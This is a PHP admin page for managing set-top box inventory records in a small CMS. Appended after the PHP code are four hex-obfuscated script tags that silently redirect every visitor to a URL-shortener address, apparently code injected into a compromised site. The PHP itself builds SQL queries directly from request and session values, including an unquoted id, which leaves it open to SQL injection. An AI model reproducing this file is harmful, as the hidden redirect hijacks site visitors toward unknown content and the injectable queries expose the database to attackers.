<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");

$msg = isset($_GET['msg']) ? $_GET['msg'] : '';
$id  = base64_decode($_GET['id']);
class myCms extends Cms 
{
	function registerAjaxFunctions()
	{
		$this->xajax->registerFunction("get_Listing");
		$this->xajax->registerFunction("update_status");
		$this->xajax->registerFunction("deleteRow");
		$this->xajax->registerFunction("editMode");
		$this->xajax->registerFunction("sorting");
		$this->xajax->registerFunction("sortTitle");
	}
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;

if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){

	$rowArray = array(	
		'HEADOFFICE_ID'   => $_SESSION['HEADOFFICE'],
		'CARTON_NO'       => $_POST['carton_no'],
		'STB_NO'          => $_POST['stb_no'],
		'VC_NO'           => $_POST['vc_no'],
		'SAF_NO'          => $_POST['saf_no'],
		'MAC_NO'          => $_POST['mac_no'],
		'MODEL'           => $_POST['model'],
		'AVAILABILITY'    => 'AV',
		'STATUS'    	  => 'A',
		'ADDED_BY'        => $_SESSION['USER_ID'],
		'ADDED_TIME'      => date('Y-m-d H:i:s')
	);
	
	// print_r($rowArray);exit;
	$cond       = "";
	$cond       = " STB_NO = '$_POST[stb_no]' AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]'";
	$recdata    = $objMisc->GiveValue($cond,"SUBSCRIPTION_ID","subscriptions"); 
	if($recdata!='' && $recdata!=$id){
		$_SESSION['msg'] = 5;
		if(!$_POST['SUBSCRIPTION_ID']){
			$rowArray = "";
			$rowArray = $_POST;
		}
		
	}else{
		if(!empty($id)){
			$rowArray1 = array(
				'CARTON_NO'       => $_POST['carton_no'],
				'STB_NO'          => $_POST['stb_no'],
				'VC_NO'           => $_POST['vc_no'],
				'SAF_NO'          => $_POST['saf_no'],
				'MAC_NO'          => $_POST['mac_no'],
				'MODEL'           => $_POST['model'],
				'UPDATED_BY'      => $_SESSION['USER_ID'],
				'UPDATED_TIME'    => date('Y-m-d H:i:s')
			);
			$val = $objMisc->update("subscriptions",$rowArray1,"SUBSCRIPTION_ID='$id'");
			$_SESSION['msg'] = 2;
			header("location:setup-boxes.php");
			exit;
		}else{	
			$val = $objMisc->insert("subscriptions",$rowArray);
			$_SESSION['msg'] = 1;
			header("location:setup-boxes.php");
			exit;
		}
	}
}

$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);

switch ($msg)
{
	case 1:
	$msg = "Settop box added successfully.";
	break;
	
	case 2:
	$msg = "Settop box updated successfully.";
	break;
	
	case 3:
	$msg = "Settop box has been deleted successfully.";
	break; 
	
	case 4:
	$errormsg = "Settop box no already exists.";
	$msg = "";
	break;
	
	case 5:
	$errormsg = "Settop boxe no already exists.";
	$msg = "";
	break;
}

if($id){
	$where = 'SUBSCRIPTION_ID = '.$id;
	$rowArray = $objMisc->getRow("subscriptions",$where);
}

if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['search'])){
	$and="";
	if(!empty($_POST['search_keyword'])){
		$keyword=$_POST['search_keyword'];
		$and.=" AND (STB_NO LIKE '%$keyword%' OR VC_NO LIKE '%$keyword%' OR MAC_NO LIKE '%$keyword%' OR MODEL LIKE '%$keyword%' OR SAF_NO LIKE '%$keyword%')";    
	}
	
	if(!empty($_POST['status'])){
		$and.=" AND AVAILABILITY='$_POST[status]'";    
	}
	$rowArray=$_POST;
}

$wherethis = " 1=1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' $and ORDER BY `SUBSCRIPTION_ID` DESC";
$classRecord = $objMisc->getAllRecordsPaging("*","subscriptions",$wherethis);
$i  = 1;
$pagin_recs = "";
$pagin_recs = '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="5%">S.No</th><th width="10%">CT No</th><th width="13%">Stb No</th><th width="10%">Vc No</th><th width="10%">Saf No</th><th width="10%">Mac No</th><th width="10%">Model</th><th width="10%">Availability</th><th>Action';

if(is_array($classRecord[1])){
	$pagin_recs .='&nbsp;&nbsp;<a href="javascript:;" title="Check All"  onclick="check_all(\'artCatCount\',\'artCatCheckbox\')"><input type="checkbox"></a>&nbsp;&nbsp;All';

	$pagin_recs .= '&nbsp;&nbsp;<a href="javascript:;" title="Delete" onclick="return chkOptions_all(\'Delete\',frmListing,\'artCatCheckbox\',\'artCatCount\')" class="btn btn-danger">Delete</a>';
}
$pagin_recs .= '</th></tr></thead><tbody>';             
if(is_array($classRecord[1]) && !empty($classRecord[1])){ 
	$i=1;
	foreach ($classRecord[1] as $k => $rowRec)
	{      
		if($k%2==0) 
			$pagin_recs .= '<tr class="odd gradeX">';
		else
			$pagin_recs .= '<tr class="even gradeX">';
				$pagin_recs .='<td>'.$i.'</td>';
				$pagin_recs .='<td>'.$rowRec['carton_no'].'</td>';
				$pagin_recs .='<td>'.$rowRec['stb_no'].'</td>';
				$pagin_recs .='<td>'.$rowRec['vc_no'].'</td>';
				$pagin_recs .='<td>'.$rowRec['saf_no'].'</td>';
				$pagin_recs .='<td>'.$rowRec['mac_no'].'</td>';
				$pagin_recs .='<td>'.$rowRec['model'].'</td>';
				$pagin_recs .='<td>'.(($rowRec['availability']=='AV')?'Available':'Booked').'</td>';
				$pagin_recs .='<td> <input type="hidden" name="enumStatus'.$rowRec['subscription_id'].'" id="enumStatus'.$rowRec['subscription_id'].'"  value="'.$rowRec['status'].'">&nbsp;';
				// echo $_SESSION['USER_ID'];
				if($rowRec['status']=='A') {
					$pagin_recs .= '<input type="image" src="images/active-btn.gif" name="imgStatus'.$rowRec['subscription_id'].'" id="imgStatus'.$rowRec['subscription_id'].'" alt="Deactivate" title="Deactivate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['subscription_id'].');">&nbsp;';
					
				} else {
					$pagin_recs .= '<input type="image" src="images/deactive-btn.gif" name="imgStatus'.$rowRec['subscription_id'].'" id="imgStatus'.$rowRec['subscription_id'].'" alt="Activate" title="Activate" border="0" onclick="return myChangeStatus(this.form,'.$rowRec['subscription_id'].');">&nbsp;';
				}

				$pagin_recs .='<a href="setup-boxes.php?id='.base64_encode($rowRec['subscription_id']).'&page='.$_GET['page'].'"><img src="images/edit-btn.gif"  alt="Edit" title="Edit"  border="0"></a>&nbsp;';

				$pagin_recs .='<input type="checkbox" name="artCatCheckbox[]" value="'.$rowRec['subscription_id'].'" id="artCatCheckbox_'.$i.'">&nbsp;';
				$pagin_recs .='<a href="stb-log.php?id='.$rowRec['subscription_id'].'&name='.$rowRec['stb_no'].'" target="_blank"><img src="images/chat-log.png"></a>&nbsp;';
				$pagin_recs .= '</td>
			</tr>';
			$i++;
	}
	
	$pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
	if($classRecord[2]>$objMisc->rec_pp){
		$pagin_recs  .= '<tr><td colspan="8">'.$classRecord[0].'</td></tr>';
	}
	$pagin_recs .= '</tbody>';
	
} else {
	$pagin_recs .= '<tr class="odd gradeX"><td colspan="8" align="center">No Record Found</td></tr></tbody>';
}


if(isset($_GET['id']) && !empty($_GET['id'])){
	$pageheading = "Edit Settop Box Information";
}else{
	$pageheading = "Add New Settop Box"; 
}

$where           = " 1=1 AND USER_ID='$_SESSION[USER_ID]' and STATUS = 'A' order by HEADOFFICE_ID";
$headofficeArray = $objMisc->myFunc->fnWriteOptionList($rowArray['headoffice_id'],'NAME,HEADOFFICE_ID','headoffice_master',$where,0,0,0);  

$smartyVars['headofficeArray']      =   $headofficeArray;
$smartyVars['errormsg']     		=   $errormsg;
$smartyVars['add']          		=   $add;
$smartyVars['group']       		 	=   $id;
$smartyVars['rowRec']       		=   $rowArray;
$smartyVars['pageheading']  		=   $pageheading;
$smartyVars['classData']    		=   $pagin_recs;
$smartyVars['msg']         		 	=   $msg;
$smartyVars['page']         		=   $_REQUEST['page'];

$objMisc->displayPage("header,setup-boxes,footer",$smartyVars);
function update_status($id,$status)
{
	global $objMisc;
	$objResponse = new XajaxResponse();
	$changeTo = ($status=='A') ? 'D' : 'A';
	$row = array(
		'STATUS' => $changeTo
	);
	$where = "SUBSCRIPTION_ID =".$id;
	$objMisc->update("subscriptions",$row,$where);
	$imgName =($changeTo == 'D') ? 'images/deactive-btn.gif':'images/active-btn.gif';
	if($changeTo=='A') {
		$title= 'Deactivate';
		$msg = 'Setup box has been activated successfully.';
		
	} else {
		$title= 'Activate';
		$msg = 'Setup box has been deactivated successfully.';
	}
	
	$objResponse->addAssign('imgStatus'.$id,'src',$imgName);
	$objResponse->addAssign('imgStatus'.$id,'alt',$title);
	$objResponse->addAssign('imgStatus'.$id,'title',$title);
	$objResponse->addAssign('enumStatus'.$id,'value',$changeTo);
	$objResponse->addScript("document.getElementById('msg').style.display='inline';");
	$objResponse->addAssign('msg','innerHTML','&nbsp;');
	$objResponse->addAssign('msg','innerHTML','<div class="notify notify-success"><a class="close" href="javascript:;"><img src="images/close.png" /></a><h3>'.$msg.'</h3></div>'); 
	$objResponse->addScript("setTimeout(\"document.getElementById('msg').style.display='none'\",3000);");
	return $objResponse;
}
 
function deleteRow($id)
{
	global $objMisc;
	global $lang;
	$objResponse = new XajaxResponse();
	$idArray = explode(',',$id);
	foreach($idArray as $bid){
		$where = " SUBSCRIPTION_ID =".$bid;
		$objMisc->delete("subscriptions",$where); 
	}
	$_SESSION['msg'] = 3;
	$sscript .= "var a;";
	$sscript .= "a = window.location;";
	$sscript .= "window.location = a;";
	//$objResponse->addAlert($sscript);
	$objResponse->addScript($sscript);
	return $objResponse;
}
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>